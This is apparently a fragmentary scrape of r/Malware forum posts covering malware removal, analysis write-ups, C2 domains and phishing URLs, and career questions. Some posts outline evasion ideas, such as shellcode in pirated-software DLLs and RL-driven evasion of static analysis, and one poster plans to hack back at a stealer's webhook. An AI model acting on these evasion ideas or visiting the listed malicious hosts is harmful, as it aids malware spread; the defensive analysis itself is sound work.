Attempts to uninstall it we're hindered by it being greyed out, I then went to Security-> Device Administrators to find that ""PornHub"" was there and active.  
Unfortunately, when I went to disable it, the screen would go to sleep immediately, and attempts to turn the screen on was a tug-of-war with the app.  
I then went and turned on Developer Mode (about phone -> tap 'build' a bunch of times) and found an option to control the amount of simultaneous background apps.  
Setting that to 'none' then retrying to disable the Device Administrator worked once I was able to tap the OK of the pop-up window that asked for verification to disable the Device Administrator while still fighting the screen sleeping.  
From there I was free to uninstall the ""PornHub"" app and hand the phone back to the customer once developer mode and it's options were set to default.  
  
I find this to be a per-case solution to this particular Ransomware, as I don't believe most phones have the option to bypass the pin number lock screen.  
  
I wrote this on my phone, so sorry if it's ugly.

Edit:
I've run into it again with another customer, but this one didn't have Device Administrator status, and was easily removed in Safe Mode",Malware,2488,426,62,1

What I really appreciate about Maldev Academy is how they dive deep into the code and explain the basics in a way that beginners can understand. They start with the basics of C programming and then move on to developing malware.

The instructors are very responsive on Discord, and it's helpful to get answers to any questions or support you may need.

Overall, I highly recommend Maldev Academy to anyone interested in learning more about malware development. I feel like I've gained a better understanding of how malware works and improved my coding skills. If you have any questions, feel free to ask me!

1668541386.0,Just failed 2/3 technical samples during a practical interview. Feels bad.,"Follow-up: I got ghosted. Lol.

-----------------------------------------------

Man, the posts I often read on Reddit about failing technical interviews in STEM came to fruition for me today. I had my second round/interview for a malware analyst position at [insert large cyber company] which was a 2+ hour practical where I had to reverse two PE's, both encrypted with a custom packer, and then go through several non-PE files such as OLE documents, PDFs, PowerShell script, and others in which I had to do standard malware analysis. I had 45 minutes per PE and used up the full 45 on both. I could not figure out how to decrypt the custom packer in either. For the third, I did well and managed to identify all of files correctly and give a rough explanation of what each file's intent was quickly before the interview needed to end.

I wasn't afraid to admit when I was especially stuck at a certain point and asked questions for which direction I should potentially go from here. When I received hints or feedback, I was sure to add what they were saying to a .txt file on the VM that they were able to see my note-taking which I would reference later. I also talked out loud, nonstop about what I was doing so they could understand my thought process and then maybe shed light as to why I was stuck.

But, yeah... this was an eye-opening experience. I need to spend more quality time in debuggers and disassemblers in which a PE is obfuscated with a custom packer as I only had experience with identifying known packers and then, if necessary, attempting to manually unpack them. All I can say is that I tried my best and didn't give up before the time ran out. The interviewer said HR would get back to me in a day or two, but I imagine they say that even if a rejection is provided. I was told they have three different teams, all with different experience and duties. Unless one of those teams focuses more on threat research with light reversing, I don't really think I can provide what they're looking for. I didn't say that, of course.

Then, pretending the packed binary is malware, we'll perform dynamic analysis on the file using x64dbg, with the goal of allowing the code to execute until the binary unpacks itself in memory. Once unpacked, we'll explore how we can dump that binary to disk for further analysis.

1585934667.0,(Meta) Earning legitimate money as a malware developer,"As a malware developer it is frustrating to see every job ad in infosec is pentester that, reverse engineer this, blue team that and so on and so forth.

So in this thread I want to ask fellow malware developers, how do you make money *legitimately*? Here are some off top my head:

1. **Work for state actors:** This is the most obvious one since the state is usually the only legitimate user of offensive software. The problem is though the only option is the country where you are born. And if your local intelligence/law enforcement agency is a mediocre shitty one you cannot join a foreign one because it requires citizenship and also nation states love to get butthurt over ""treason"" and you have to deal with all that drama. Also working with government officials is a similar experience to having constipation.
2. **Work for private companies that work for state actors:** Compared to the previous, this one is a little bit more flexible. But from what I saw these companies are so archaically engineering focused like in “you have to graduate from computer engineering and have a 3.8+ GPA” or you have to solve that stupid engineering test where there are hundreds of math and geometry questions because that's obviously a good metric of your offensive software development skills.
3. **Game hacking:** ...Sigh. It has good money and legally/ethically it is somehow in a gray area as long as you have a way around cease and desist letters. It is also over competitive, forget about making hacks for popular games, those corners are already taken and those who did probably do a better job than you do. You have to make your own toolset to automate some processes, reverse engineer the AC and look for ways around them. Like I said adequate money but not really exciting to get 13 years olds spend their parents' credit card.
4. **Stalkerware:** No thanks. I don't want to be the main topic of a [Eva Galperin talk](https://www.ted.com/talks/eva_galperin_what_you_need_to_know_about_stalkerware).

Why this is an important topic is that there are many young guys who love developing malware just like me. I have a weird fascination with building offensive trap-like constructs since I was a kid (The first *malware* that I developed was a tea can with a hidden electric cable. Whoever would pick up that can from the floor would get electrified and die according to my 5 years old brain. I know, like I said *weird*.).

And when these young people get hungry and look for a legitimate way to make money but cannot do so they might decide to [*break bad*](https://www.youtube.com/watch?v=8h-iAZBtNrs). And the money in crimeware is *insanely* good and as that much ethically toxic, the more you consume it the more you turn into an asshole who rationalizes his bad behavior by excuses like “Oh, but the banks and the system are compensating the losses. I ain't doing anything bad! It's just free harmless money bruh!”. Yeah the system is bad and this is exactly why it is bad, because of people rationalizing their unethical behavior. And don't get started with how people get caught or whatever. Actors with good OPSEC and who are not low hanging fruits don't get caught, I have seen it with my own eyes, those fuckers have Grand Theft Auto with money cheat like digits in their BTC accounts. Fuck the law. This is not a law problem, this is an ethics problem, a thing people have forgotten since the Ancient Greek and Roman Empire.

Don't think this is unimportant. [Marcus Hutchins](https://krebsonsecurity.com/2017/09/who-is-marcus-hutchins/) was one of those young guys. And there are many like him and some of them will spend many years behind bars because they are not lucky enough to sinkhole a domain and save the world. And once they get out, no legitimate company will hire them with their skillset because today's society is mostly selfish and hypocrite and obsessed with their good image. So once a criminal, always a criminal.

1479307926.0,"Malware spreading through Android devices, via Facebook messenger.","A friend of mine, via her Android 6.0 device, yesterday (15.11.2016) received an odd looking message from a host at `jimdo.com`. She clicked on it, and was ultimately redirected her to a porno site. The next day (16.11.2016), her Facebook account was used to send out hundreds of messages for a different host at `jimdo.com`. 

I have yet to inspect the Android device, but I have found that her Facebook account was not per se hacked. There were only two currently in-use sessions -- her Android device and the Windows host I had logged in with under her credentials (with explicit permission of course). There were about 7 or 8 other devices with valid sessions, but none had been active this year. She reports she had not used the Windows browser to access Facebook since the 12th of November.

This leaves me with the tentative conclusion that Google Chrome on Android itself has the vulnerability. At this time, the only info I have is that it's version 6.0. 

I also clicked on her message. I also got redirected to the Prono site. However, there is no indication (yet) that my Facebook account has been subject to unauthorized use. (Just in case, I beefed up security and dropped the current session). One difference may be: I used Facebook within the browser and not as a separate app. Another difference: I'm using Android 5.0 (Jan 1 16 security update). 

On Windows, I used Chrome with a new profile to visit the `jimdo.com` site. I used a new profile and a secondary Facebook account. In this environment, a visit to that site _did not_ redirect me. Thus, I suspect this website or one of its javascript providers has been hacked with a malware payload. HTTP Trace indicated visits to the following hosts:

    a.jimdo.com
    assets.jimstatic.com
    delivery.brokerbabe.com
    fonts.googleapis.com
    fonts.gstatic.com

    u.jimcdn.com
    widget.supercounters.com
    www.googletagmanager.com
    www.supercounters.com
    zepogihise.jimdo.com

I will note (complain) that Facebook does not publish a way of reporting malicious links sent in messages. You can report posts, you can report ""spam"", but not fishing or malware links. 

2016-11-17 Update: Cropped screenshots of messages. http://imgur.com/a/qEM20. The message from one user was always the same. Working hypothesis: hostname of URL morphs with every new infection.

**Update 2**: I tried the link again. Before doing so, I logged out of Facebook (Chrome) and logged in with an alternate account. (Yes, I have such a thing. Shock!) When I clicked on the link from within the Messenger App, the redirections eventually landed me at a fake Facebook login page. The URL shown is:

    http://authentionz-at.videoshareza.xyz/movill.php?lang=en&key=

Yesterday, when I tried that link and was logged into Facebook, I did _not_ see this prompt.  The friend claims she did not see or enter the password on this form, and that's something I can confirmed by looking at the Facebook privacy settings: no recent new sessions.  Working hypothesis: **this is a fake fake page, meant to deter security experts** by leading us to the conclusion that the user entered their credentials on this phishing page.

1675011562.0,Recommendations for becoming a better malware analyst as a non-coder,"TL;DR I've been working in cybersecurity for 4+ years as a threat intel analyst. I came in with a very weak background in the field, i.e. only basic understanding of computer operating systems, networking, etc. I am a quick learner though and have been educating myself, mostly on concepts, about these topics and have reached a point where I feel comfortable performing basic static analysis on malware samples, can write simplistic Yara rules to detect uncommon strings, etc. 

I recently took SANS 610 with Lenny Zeltser which was an incredible learning experience but also very humbling. It made me realize how much of a gap there is between my level of knowledge and even what an entry level reverse engineer would have. To be clear, I have no aspirations to become a reverse engineer but being more comfortable playing around with malware to understand its capabilities, and quickly and proficiently write rules to detect it, is becoming a more important part of my day-to-day. I also just find it incredibly interesting. Combining RE work and hunting for samples with my already strong OSINT/investigative background is what I enjoy most about what I do.

The two areas I lack critical knowledge are: understanding of Windows internals, code, specifically assembly, and how memory functions. I can barely comprehend higher level code but working with debuggers and Ghidra was extremely difficult for me. I know there is no easy button or fast path to getting past this, but I wanted to ask here **what people would recommend as a way forward in order to develop a baseline understanding and familiarity with how Windows functions and how to use debuggers and disassemblers**? I think my biggest knowledge gap here is understanding programming logic and how memory works. 

My very rough plan at the moment is:

\-*Go back to basics*: Use books and YouTube to build the foundation of OS, memory, etc and other core CompSci topics

\-*Learn an easier language*: I know a stronger knowledge of Python would accelerate my ability to automate my workflow and simultaneously give me some of that programming logic I severely lack.

\-*Keep up with coursework*: FOR610 really motivated me to keep up with RE-focused coursework and tutorials, even when it is a bit above my level. I was able to keep up with most of the in-class exercises because of Lenny and the walkthroughs in the books and I have to think at some point it will rub off a bit, even if a lot still goes over my head.

Sorry for the rambling post, but if anyone has any suggestions whether it is a general approach, specific books or courses they found helpful, etc, critique, I'd really appreciate it!",Malware,2669,452,49,1

Vice [dominates](https://imgur.com/a/6HmEQEi) in terms of these victims, including in recent months.

The underlines & numbers in the cells indicate *number of malware mapped to that technique*. Background color gradient represents *number of sources* referencing it. This tool helps with pivoting to defenses and analytics (think Sigma rules), offensive tests (Atomic Red Team), and data sources (make sure you have proper logging enabled) mapped to the same techniques.

When I look at ""top"" TTPs like this, I use a rough system (working to refine it) to filter out ATT&CK techniques that are defined most broadly (it's also less useful to know something like T1486 had the highest count, since that's inherent in a ransomware attack). With this approach, here are techniques that appeared commonly among many of the strains and which generally seem more ""interesting"" to me from a defense/detection/testing standpoint:

* **LSASS Memory** (T1003.001): So many ways an actor can implement this, so multiple layered detections are best. Lots to choose from, there are a whopping [60+ Sigma analytics](https://app.tidalcyber.com/technique/ab0da102-5a14-42b1-969e-5d3daefdf0c5-LSASS%20Memory) mapped to this
* **Registry Run Keys / Startup Folder** (T1547.001): Also many ways to carry this out but also many public analytics (20), and Atomic tests (9)
* **Scheduled Task** (T1053.005): A perpetual technique used by [40+ groups and almost 90 software](https://app.tidalcyber.com/technique/723c6d51-91db-4658-9ee0-eafb953c2d82-Scheduled%20Task) defined in ATT&CK. Also lots of ways to detect and test this activity. Pivot to source articles to see the ransomwares' implementations, but also worth checking capabilities against other variations
* **Windows Service** (T1543.003)
* **DLL Side-Loading** (T1574.002): Another technique used by a ton of actors & malware recently, including initial access & loader tools like QakBot
* **Token Impersonation/Theft** (T1134.001)
* **Cached Domain Credentials** (T1003.005): Only used by one of the ransomware here but this one is fun to test - crazy how easy it can be to dump credentials sometimes.

* **Disable or Modify System Firewall** (T1562.004): Many of the techniques that involve [disabling](https://app.tidalcyber.com/technique/e3be3d76-0a36-4060-8003-3b39c557f728-Impair%20Defenses) or [tampering with](https://app.tidalcyber.com/technique/fc34e661-55c3-47be-a368-c2f5776cdd17-Clear%20Windows%20Event%20Logs) security tools or logging are great candidates for ransomware detection.

A few weeks ago I made [a post here](https://www.reddit.com/r/Malware/comments/xeoo5g/novel_pdf_malware_injecting_javascript_into_the/) about a PDF that evaded all malware detection and caused a security breach, almost certainly through PDF instructions hidden inside of an Adobe Type1 Font binary stream embedded within a PDF. At the time I posted a link to a tool I wrote called [The Pdfalyzer](https://github.com/michelcrypt4d4mus/pdfalyzer) that diagrams a PDF's internal and scans for various suspect content.

While I still have not figured out the exact mechanism behind that PDF which apparently opened a backdoor on one of the machines on my network, I have been hacking away at it. I added all the malicious PDF YARA rules I could find to The Pdfalyzer and also wrote [a new YARA rule to detect the suspicious bytes](https://github.com/michelcrypt4d4mus/pdfalyzer/blob/master/yara/PDF.yara#L903-L920) I identified in that PDF. I found myself wanting a way to extract certain kinds of quoted byte sequences and analyze them. In particular I was hunting through the binaries for quoted bytes (bytes between ' and "" chars), guillemet quoted bytes (the kind the PDF specification uses), and *especially* anything that could be a regular expression (between / chars in Javascript) that might be used to decode other parts of the binary.

Long story short I ended up realizing that I could use YARA as a generic backend matching engine to locate these and other byte patterns and a couple of python libraries to try to detect the character encoding and/or force encodings of my choice upon the matched bytes. I ended up extracting the binary regex/YARA match/force decode part of The Pdfalyzer into a new tool that just does the matching/decoding part, which I called [The Yaralyzer](https://github.com/michelcrypt4d4mus/yaralyzer).

Here's a screenshot of the output when matching the regex `/(.*?)/` (a regex to find potential regexes). The highlighted parts are the actual matches and the grey parts are the bytes before and after the match.  The before/after was a thing I wanted to inspect that YARA couldn't easily produce.

During the project implementation for my bachelor's thesis **\[1\]**, a software (named dike, as the Greek goddess of justice) capable of analyzing malicious programs using artificial intelligence techniques, I was unable to locate an open source dataset with labeled malware samples in the public domain. As a result, I created DikeDataset, a dataset with labeled PE and OLE samples **\[2\]**. Because it was not the main focus of my thesis, the samples attributes are not evenly distributed (the benign-malicious and OLE-PE ratios are quite low), but the dataset aided greatly in the research process.

This week, I was surprised to see that the public GitHub repository (which was used only for storage, without any promotion on communities like this) gained some organic reach (views, clones and stars).

I’ve just released “Pulling Threads”, the latest episode in the “Introduction to Memory Forensics” series. We’ll analyze a Windows 10 memory image potentially infected with malware. We’ll use Volatility to look for suspicious processes, and then we’ll look at network artifacts to discover any potentially malicious traffic. We’ll discuss ways to detect process injection and process hollowing (some of which we’ve covered in a previous episode in this series), and finally, we’ll dump one of the identified suspicious processes to disk for further analysis and reverse engineering.

1459525389.0,lnkr.us Re-Direct Malware Report,"I came across some malware today while browsing Reddit and did some research. My browser was redirecting the links that I clicked on to something like the following: 

        https://lnkr.us/get?sourceId=5&uid=50639x1409x&format=go&host=icontent.us&out=https%3A%2F%2Fwww.washingtonpost.com%2Fnews%2Fthe-watch%2Fwp%2F2016%2F01%2F29%2F80-percent-of-chicago-pd-dash-cam-videos-are-missing-audio-due-to-officer-error-or-intentional-destruction%2F%3Fpostshare%3D7901454147211893%26tid%3Dss_fb&ref=https%3A%2F%2Fwww.reddit.com%2Fr%2Fnews""
        

And then it would re-direct the browser again from the above link to an advertised website that they probably had on a list. uBlock Origin luckily halted both redirects. If you want to go and hack the hackers and test for an insecure redirect/forward on them, I wont tell you no, but I'm not going to do it.

This only happened probably around 50% of the time I clicked an HTTP link.

An extension that I've been using called Better History is infected with this ""lnkr.us"" redirect malware since March 23rd.
        
A review from the store page says: ""One star until shady permissions are verified, and there is outdated content on github and the twitter feed. it would appear this extension has been hijacked and could be used for nefarious purposes. I would think carefully before you install it.""

The version on github is 3.9.5, the version on the store page is 3.9.8. Definitely hijacked. The permission that clearly throws the red flag is that it can read and change all data on the websites you visit.

The newly added permissions in the manifest.json which was not posted to github: 

    ""http://*/*"", ""https://*/*"", ""idle"", ""webNavigation"", ""webRequest"", ""webRequestBlocking""

It also calls for a new script called ""common.js"". Common.js contains the following:

    if(localStorage)
    {
    	localStorage[""ipirat_isInstalled""] = true;
    }

Huh, weird eh?

1446436350.0,[Beginner] What did I find?,"For starters, I should point out that I'm a beginner with little software engineering skills. While I'm learning, I mostly rely on network forencis and high level process/OS activity for dynamic analysis. I downloaded this sample from malwr.com (link) as something to practice with and found something that I'm not really sure where to start with. 

**The make a quick summary of what I'm looking at:**

The file from the link is a dropped that performs and HTTP get request for gooogledownloadfree[.]net/config/bin.zip. 
This file is extracted into %appdata%\Roaming\NetworkService and drops several executable files, DLLs, and a CA certificate. The CA is moved to the trusted certs folder and seems to be used later for SSL MITM. A ""NetworkService"" service is created and points to one of the dropped exe's. This service opens a port 0.0.0.0:6666 , seemingly to serve as a mitm proxy. 

All traffic goes back to the same IP address the dropped grabbed its binaries from, under a different domain name: youtube4tr[.]com. There is a post to youtube4tr[.]com/api containing a sort of unique ID and some other info I havent figured out yet. 

    POST /api HTTP/1.1

**The interesting part(s):**

In poking around, I browsed to the c2 server and got a 404 error on the root directory. However, the /config directory is full of folders with date stamps. Each folder contains several .txt file with a name similar to the unique ID spotted in the aforementioned HTTP post. The text files look like they contain keystrokes or something, but nothing else. Most of the language seems either be Portuguese or Italian. Incidentally, I couldn't located any text files with my unique string.

In futher prodding, I found a list of domains registered by the registrant for original c2 domain (gooogledownloadfree[.]net). The registrant is Oasis Games and some of the other domains returned are: 


    85.195.110.142 	account.uumessenger.com
    85.195.110.142 	api.uumessenger.com

    85.195.110.167 	lotr.oasgames.com

Some are no longer active, others I haven't looked into yet. However, gogledownload[.]net has another file index listing. Of particular interest is http://gogledownload[.]net/download/ which lists an executable 'GoogleMgr.exe'. 

I threw that one in the sandbox and this is where I'm totally lost. 
An HTTP connection is made back to the domain on port 4013. The stream fist send a login of some sort (not sure of encoding), then the client queries ipinfo.io and sends the returned json string (base64 encoded) to the server. 

An HTTP port 8787 is opened on the client, which I cannot connect to the life of me. Any attempt returns a 400 error with ""CallID:"" string appended as the error text. 

The exe spawns a cmd window but it isnt interactive it all, simply displays some info about the connection back to the server. (will screenshot if there's any interest). When an HTTP  request is made, it displays the HTTP packet in the console, but there is no response in the browser. 

Has anyone seen anything like this before? Is anyone interested in looking a bit further into this? Any advice for moving forward?

Apparently this is a modified version of a quite popular [pirate stealer](https://github.com/Ralstof/bbystealer), but while I was excited to grab the webhook URL and play with the attacker that paid for this NodeJS script, I found out they actually route it through two URLs. I'm not yet exactly sure if they request this API to call a webhook URL, or if they pass the webook to the API. Nonetheless, I should be able to directly invoke it myself...

I ran Wireshark and was able to find out DNS requests to:

mdvksublbpczqluqvvbytfprxdwakuke\[.\]nl and socket\[.\]bby\[.\]gg

Unfortunately, the application data was encrypted and my attempts to decrypt it were unsuccessful.

Also tried to view the `strings` in the executable but it seems highly obfuscated as I couldn't find any function even invoking a webhook or that URL.

This seems like a challenge and even though I hit a wall, I'm still investigating for alternatives that could help me gain access to the API to post some fun content on a discord channel somewhere.

I don't think I can directly post the sample here.

If anyone's bored and willing to provide an extra hand, I'm happy to share the executable file!

If you would like me to share it directly, just post a comment or DM me.[https://www.virustotal.com/gui/file/483c6b8bbe6ad389a7958440c66c2176c522647105049933545b4fafd9d33b64/detection](https://www.virustotal.com/gui/file/483c6b8bbe6ad389a7958440c66c2176c522647105049933545b4fafd9d33b64/detection)

**EDIT 2**: With the help of u/Trolling_turd and u/itsVermin we are able to narrow down the following findings:

* The EXE is a bundled javascript executable even though the strings are obfuscated, only a few dependencies can be read.
* The Wireshark PCAP contains the DNS requests to the hosts but it doesn't seem to be possible to decrypt the traffic. It could possibly use the raw 443 port, but encrypt it in some other way.",Malware,2626,370,69,1

1495270278.0,Passionate Beginner with some questions.,"Hey guys,  
I know there's probably a post like this everyday asking how to become a Virus/Malware, ReverseEngineer Analyst, so if nobody replies I wont be too offended.  
&nbsp;  

I have done some researches on this subredit, and If anyone have the time to read through this and can help steer me in the right direction or perhaps let me know of something I may have missed while researching, please let me know!  
&nbsp;  

My Background:  
Not really a Programmer, but have learned a ltitle bit of Java back in the days in college.  
Have studied a little bit of Python through the book Automate the Boring Stuff (first half of the book)  
Have attempted to study some C++ a while back, but only gone through a few chapters.  
Overall, I'm not completely new to programming concepts, but at the same time I have never stuck long enough to really learn any language extensively or put them into a lot of practice.  
&nbsp;  

**Q1**. What Programming Language should I focus on? (ASM) Assembly? C? C++? I think one of the books below even teaches by using Python? The most important is probably Assembly right? But when do C or C++ come into play? Which should I start learning now? I actually don't mind learning Assembly as I've always been fascinatinted with it (especially after seeing how people from demoscene use it to create size-restrictive yet mindblowing visuals.) But should I also learn C or C++ too? How should I Prioritize these programming language? Which should be the primary, secondary,etc?  
&nbsp;  

Also, when it comes to these languages, what's the level of expertise that's required? I mean for something so complex and encompassing as C++, people can literally spend a lifetime and still discover new things about it everyday :D I'm guessing I should have a solid understanding of how programming works, its concepts, understanding memory usage, things such as buffer overflow, etc. Basically have a firm grasp of how programming works?  
&nbsp;  

**Q2**. From googling and searching this subredit, I've gathered and listed some of the resources people have been recommending. Books, Forums, IRC Chatrooms. Does anyone have any other recommendations by any chance?  
  
Are there any Virus/Malware researchers, groups,twitters, blogs that you follow religiously?

1592070007.0,Repost due to false DMCA (Presumably by the person who created the script)," 

Hey, all,  A few days ago, I started getting weird pop-ups from very bizarre sites called IGCritic and PPCorn. I won't link to the sites directly as they've already had record levels of traffic as a result of this scam, but both of the links are weird old articles about cute animals. Strange, right?  I got in touch with a bunch of people who were having the same issue (which was surprisingly hard to do as this time 2 days ago there was basically nothing online about the problem) and we've been working in a Discord to isolate what's going on. Here's what we know:  - A scammer from a 'company’ called extensionmetric.com  has been contacting the developers of popular extensions with an offer to pay them in exchange for adding a harmless looking and sounding analytics script. The scam is very credible-sounding, the site looks legit on first glance, and it's done over the phone (with an American accent).  - We've identified four Chrome extensions/apps which have been compromised:  1. Github Gloc 2. Chrome Currency Converter 3. Promoted Pin Hider 4. Notepad (the Chrome app)  - There are definitely more, we just don't know what they are yet.  


\- The code causes your browser to, at somewhat regular intervals, call up a series of bizarre sites which (using some kind of API thing which I don’t understand) redirect you to the sites in question. Sometimes to Google. The sites open in their own window (in the bottom-right of your monitor, I think) and are usually inaccessible. It opens behind everything else you have open.   - I can go into more detail if you’re interested, but the mechanism of how the scammer is profiting from this is a little obscure to us at this stage. It’s hard to know what the vector of the scam is, but it doesn’t take much imagination to realise that the ability for an extension to consistently open windows without your permission isn’t great.  - If you’ve got any of these extensions, uninstall them. You’re gonna be redirected to a page called NativeAutomation when you do--this is part of the code the scammer has had added to the extensions. I recommend deleting the cookies which you get from this site for obvious reasons.  We’ve been doing a lot of digging, but we still don't know the full extent of what the malicious code is doing. The guy perpetrating this scam was previously investigated by the FBI for a similar crime  about a decade ago in which he tried to sell half a million dollars of data to a company which reported him to the FBI.

1551099616.0,Malware De-obfuscation technique,"I have been doing malware analysis recently. From the readings, I learnt that common way to obfuscate a malware is :

1.Register swap

2.Sub-routine re-ordering

3.Dead code insertion

4.Instruction substitution

5.Transposition of independent code

Hence, my doubts are:

1. Am I missing some obfuscation technique?
2. Is there any way to de-obfuscate (say dead code removal) the malware(specific to PE files) for better analysis ? (I guess there wont be any concrete approach, may be some heuristic approach )

1548506115.0,How feasible is it to hide malicious code in pirated software?,"As a thought experiment I was thinking about how feasible it would be to hide malicious code inside a pirated software. Most people just assume malicious content would be only hidden in .exe files and as a result they only upload the main PE file to online virus scan sites if they suspect anything and if it comes clean they assume it should be okay. But on the other hand you can also modify the .dll files and add your malicious shellcode inside a code cave or you could just make a new wrapper dll around the original dll (like a packer) and run your malicious code in the entry point and then transfer execution to the original dll's entry point and so on. I am sure there are lots of other methods, these are just off the top of my head.

I'll be honest, I do pirate software especially with video games since demos are rare these days and I don't want to financially support some of the developers because of mispractices. And for some other professional software that requires 1000 - 3000$ per year but you don't have that kind of money yet and that particular software is the de-facto solution for that particular problem and the alternative FOSS software is just a crippled mess.

What makes it especially scary is the fact that still a lot of users pirate software constantly. Some are broke, some have political reasons, some because it is free so why the hell not, and some a little bit of everything. With some popular software you can have like 1-3k downloads in a single day for a single release, even more. If you are smart and you do things like delayed execution with random jitter or monitoring file system for user initiated software execution and then delivering your payload you can minimize/redirect suspicion for the campaign. And if you are able to lie and craft a long term fake persona such as ""Bill the Friendly Pirate Guy Who Brings You Otherwise Expensive-and-Hard-To-Find Software for Free"" you are just solid. The only possible threat is ""that guy"" who knows .dll files are also PE files and will reverse-engineer your binary to prove everyone you are an a**hole but for some reason he still pirates stuff even though he knows that he shouldn't exactly for these reasons.

1470095000.0,New malware going around: AntiUsb and AntiUsbShortcut,"Hi folks

Currently clearing out some malware from the PCs at work; something that showed up back in May this year but hasn't been reported 'til recently. 

Has anyone here encountered something called AntiUsb or AntiShortcut (or some other variation on the name)? It's a pair of hidden folders in the Windows install directory that both have the same contents: an executable file called AntiUsb.exe, an executable WinZip file called AntiUsbShortcut.zip, and two shortcuts that point to the other two files.  
These folders also clone themselves onto the root directory of any other local disks and any removable drives that are plugged in. 

All I've been able to discern from it so far is that it goes through top-level directories and creates shortcuts that seem to just loop back onto the folders they were created in, but when I delete them the confirmation dialog box says it points to System32\cmd.exe. Given that AntiUsb.exe is almost 1MB in size and AntiUsbShortcut.zip is 3.5MB, I'm hesitant to believe that that's *all* it's doing, but I can't see it doing anything else. 

I killed the running process AntiUsb.exe, then deleted the folders, but after rebooting they were back. I had a look through the registry and found some persistence entries that were restoring them upon shutdown/restart. Cleared those out, then deleted folders again, then manually deleted every rogue shortcut I could find. 

Had a look around the net but there's hardly anything out there (anything helpful, at least). Anybody else seen this little bastard floating around? ",Malware,1561,253,39,1

Does anybody here has a collection of C malware or knows where I could find those? The malware will be converted to x86 assembly where I will work on them then. Why C? Because I made the experience that it is the language that can be converted to assembly the easiest using GCC. In addition to that it is next to impossible to find malware that is directly written in assembly.

What is my intention?

I want to work on x86 assembly and make small automated non-function changes to the assembly and compile it so that it can trick static analysis into thinking that the malware is a benign program.  I intend to utilize deep reinforcement learning for that and compare the the results with random addition of non-functional changes. So I can see if it is reasonable to use Deep RL instead of just adding random non-functional changes to the assembly.

1462889048.0,Learning resources after Practical Malware Analysis?,"I'm a programmer/infosec student, getting into Windows malware analysis. I started by reading the Practical Malware Analysis book, as often recommended. I have finished it, and it was a great starting point.

But the book is pretty old now, it doesn't really cover anything that happened after Windows XP. I would like to learn more about the topics not covered in this book. I'm thinking ransomware, malicious documents, security techniques since Vista (like ASLR) and how it changed malware. 

I'm mainly looking for theoretical resources (books, papers) preferably with some exercises. Even a list of topics or words to Google would be very helpful (topics about Windows malware analysis not covered in Practical Malware Analysis). ",Malware,735,115,19,1

How much do certifications help me in for my resume and which one(s) should I get? Will experience ultimately be better than a cert? And finally, when should I get certified? I'm currently a sophomore studying information assurance, should I wait until I graduate to get certified?

Sorry for the abundance of questions, and thanks for helping.",Malware,464,79,12,1

1402304348.0,Imgur serving Malware masquerading as Flash update?,"I just visited this Reddit story: http://www.reddit.com/r/movies/comments/27nioe/11_best_movies_that_takes_place_over_one_day_or/

and expanded the gallery using res. Immediately I received a popup saying that the page could not be displayed without updating Flash, together with a reasonable facsimile of the Adobe Flash downloader page. On dismissing the alert, my browser downloaded an executable called 'set-up' 

The URL associated with the file is: http ://get.download2desktop.com/DownloadManager/Get?p=7302&d=1775&l=1694&n=0&d1=13409&clickid=835160861, http ://downloads.giochimobi.com/FPlayer/UK/auload.html?installer=Flash_Player_13_for_Other_Browsers&browser_type=KHTML&dualoffer=false

The file didn't execute, and I'm on a Mac. But I was wondering whether anyone has seen this before, and whether there is somewhere sensible to report this. I've retained a copy of the file.

Oddly enough the same thing happened four times, but now the page appears to display correctly. Possibly a compromised advert?

I've tried starting the application in question (on the already infected w10 machine) and analyzing through wireshark if it sent any packets over the network but my lack of knowledge using wireshark got me to a dead end.

I've just released ""Visual Analysis with ProcDOT"", the latest episode in the ""Introduction to Malware Analysis"" series, covering a neat utility called ProcDOT. As you are likely aware, Sysinternals’ Process Monitor, also known as Procmon, in combination with PCAP data provides a treasure trove of information that is commonly used in behavioral malware analysis. The problem is, data from those sources is disparate, and typically manual analysis is required to correlate process-related information from Procmon with the corresponding network-related activity derived from the packet captures. What if there was a utility that did that for us, AND presented the results in an interactive, visual format? Enter ProcDOT.

I just don't know how the attacker is to get the data. If the data is stored on the node, what if it goes offline? Then wouldn't they miss out on a bunch of stolen data.

Perhaps it has nothing to do with being stored on the victim, and the malware just sends it to a dropzone or email or something?

The second zip is called ""MONEY_28966_ZIP.zip"", heck - is that nigerian prince finally sending me my money back?   
I guess not, in there is just a single .js file. At this point I expected some executable with a sneaky hideous name... but just a js file was kinda dissapointing.  
Opening it up only revealed some thoroughly obfuscated JavaScript code:
http://hastebin.com/sijexegoqo.sm  
Deobfuscating this manually was only considered for a fraction of a second after looking at it so I just ended up pushing it through some online deobfuscators. After all, I couldn't even run it. But the furthest they got was:
`0. return upvuqab[idwunharg].pop  `  
`1. return 'Scripting.FileSystemObject';`  
`2. var ahcicx = WScript.CreateObject(puxijug6); var rezlime31 = ahcicx.GetFileVersion('C:\\\\Windows'); if(rezlime31 == '') return true;`  
`3. TypeError: WScript.CreateObject is not a function`  
  

As it turns out, the script is trying to use WScript which is according to my research an object provided by the W/CScript.exe hosts so I probably had to use Windows's MSHTA.exe to even run the thing.

I dumped it into an online tool for identifying shellcode in documents called (cryptam.com) and it recognized the following shellcode exploits:



exploit.office RTF MSCOMCTL.OCX RCE CVE-2012-0158



During dynamic analysis, running the file in my VM it launches MS Word and then instantly throws an exception ""There is not enough memory or disk space to complete the operation"". And then nothing else happens. So it looks like the shellcode is throwing the exception but then there is no ""payload"" that it does aftwards? Making me think the file file is somehow incomplete or missing parts to it.



But the thing I am trying to determine is WHAT the shellcode actually does. I am trying to use various tools to Convert Shellcode to EXE's or to assembly instructions but nothing has been working. I am not sure exactly WHAT part of the file is shellcode, as in where it starts and stops within the file.

1436483094.0,Tron v6.3.9 (2015-07-09) // Adobe Flash update; Sub-tool updates,"##Background

Tron is a script that ""fights for the User""; basically automates a bunch of scanning/disinfection/cleanup tools on a Windows system. I got tired of running these utilities manually and decided to just script the whole thing. I hope this helps other techs and admins.

----------------------------------------

##Stages of Tron:

0. **Prep**: `rkill`, `ProcessKiller`, `TDSSKiller`, `Stinger`, `registry backup`, `WMI repair`, `sysrestore clean`, `oldest VSS set purge`, `create pre-run System Restore point`

1. **Tempclean**: [TempFileCleanup](http://www.reddit.com/r/usefulscripts/comments/33grs0/batch_tempfilecleanup/), `CCLeaner`, `BleachBit`, `backup &amp;amp; clear event logs`, `Windows Update cache cleanup`, `Internet Explorer cleanup`, `USB device cleanup`

2. **De-bloat**: remove OEM bloatware; customizable list is in `\resources\stage_3_de-bloat\oem\`; Metro OEM debloat (Win8/8.1/2012 only)

